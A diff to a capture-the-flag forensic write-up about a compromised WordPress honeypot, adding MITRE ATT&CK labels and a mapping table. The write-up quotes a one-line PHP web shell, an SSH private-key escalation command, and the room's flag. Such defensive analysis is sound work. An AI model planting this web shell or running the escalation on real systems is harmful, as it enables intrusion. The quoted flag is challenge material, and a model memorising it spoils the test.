@@ -42,6 +42,8 @@ Key tools configured on the system:
 
 ## Question 1 — Which web page did the attacker attempt to brute force?
 
+**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing
+
 ### Investigation
 
 Reviewing the web server access logs for unusual patterns:
@@ -69,6 +71,8 @@ Mozilla/5.0 (Hydra)
 
 ## Question 2 — What is the absolute path to the backdoored PHP file?
 
+**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell
+
 ### Investigation
 
 After a successful brute-force, the attacker authenticated to the WordPress admin dashboard and injected a web shell into an existing theme file to avoid creating new suspicious files.
@@ -87,7 +91,7 @@ system($_POST['cmd']);
 
 This one-liner gives the attacker full remote command execution by sending OS commands via HTTP POST requests to the file.
 
-The file was placed inside the **Blocksy theme** directory — a legitimate theme folder — to blend in with normal WordPress files.
+The file was placed inside the **Blocksy theme** directory — a legitimate theme folder — to blend in with normal WordPress files. This is a deliberate **masquerading** technique (T1036) where the attacker hides malicious content inside a legitimate application directory.
 
 ### Answer
 
@@ -99,6 +103,8 @@ The file was placed inside the **Blocksy theme** directory — a legitimate them
 ---
 
 ## Question 3 — Which file path allowed the attacker to escalate to root?
+
+**MITRE ATT&CK:** T1552.004 — Unsecured Credentials: Private Keys
 
 ### Investigation
 
@@ -131,6 +137,8 @@ ssh -i /etc/ssh/id_ed25519.bak root@localhost
 
 ## Question 4 — Which IP was port-scanned after the privilege escalation?
 
+**MITRE ATT&CK:** T1046 — Network Service Discovery
+
 ### Investigation
 
 Once root access was achieved, the attacker pivoted to internal network reconnaissance — a classic lateral movement preparation step. Reviewing auditd logs for network-related syscalls:
@@ -156,6 +164,8 @@ Targeted ports: **22 (SSH)**, **80 (HTTP)**, **3389 (RDP)** — indicating the a
 
 ## Question 5 — What is the MD5 hash of the malware persisting on the host?
 
+**MITRE ATT&CK:** T1543.002 — Create or Modify System Process: Systemd Service
+
 ### Investigation
 
 The attacker established **system-level persistence** by creating a malicious `systemd` service designed to survive reboots. Checking for suspicious services:
@@ -165,7 +175,7 @@ systemctl list-units --type=service | grep -v "standard"
 cat /etc/systemd/system/kworker.service
 ```
 
-The service was named `kworker.service` — deliberately mimicking the legitimate Linux kernel worker process name (`kworker`) to deceive administrators. The malware binary was placed at:
+The service was named `kworker.service` — deliberately mimicking the legitimate Linux kernel worker process name (`kworker`) to deceive administrators. This is a **masquerading** technique (T1036.004) where the malware impersonates a built-in kernel thread. The malware binary was placed at:
 
 ```
 /usr/sbin/kworker
@@ -187,6 +197,8 @@ d6f2d80e78f264aff8c7aea21acb6ca6
 ---
 
 ## Question 6 — Can you access the DeceptiPot in recovery mode?
+
+**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials In Files
 
 ### Investigation
 
@@ -258,6 +270,23 @@ THM{acc3ss_gr4nt3d!}
     └─ Target: 172.16.8.216
     └─ Ports: 22, 80, 3389
 ```
+
+---
+
+## MITRE ATT&CK Mapping
+
+| # | Phase | Technique ID | Technique Name | Evidence |
+|---|---|---|---|---|
+| 1 | Initial Access | T1190 | Exploit Public-Facing Application | WordPress exposed in DMZ with no WAF |
+| 2 | Credential Access | T1110.001 | Brute Force: Password Guessing | Hydra against `/wp-login.php` |
+| 3 | Execution | T1059.004 | Unix Shell | Web shell executing OS commands via `system()` |
+| 4 | Persistence | T1505.003 | Web Shell | `404.php` injected into Blocksy theme directory |
+| 5 | Defense Evasion | T1036.004 | Masquerading: Match Legitimate Name | `kworker.service` mimics Linux kernel thread |
+| 6 | Privilege Escalation | T1552.004 | Unsecured Credentials: Private Keys | `id_ed25519.bak` exposed at `/etc/ssh/` |
+| 7 | Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | Cleartext password in `deceptipot.conf` |
+| 8 | Persistence | T1543.002 | Create or Modify System Process: Systemd Service | `kworker.service` registered for reboot survival |
+| 9 | Discovery | T1046 | Network Service Discovery | Netcat port scan → `172.16.8.216:22,80,3389` |
+| 10 | Discovery | T1018 | Remote System Discovery | Ping sweep of internal network segment |
 
 ---
 
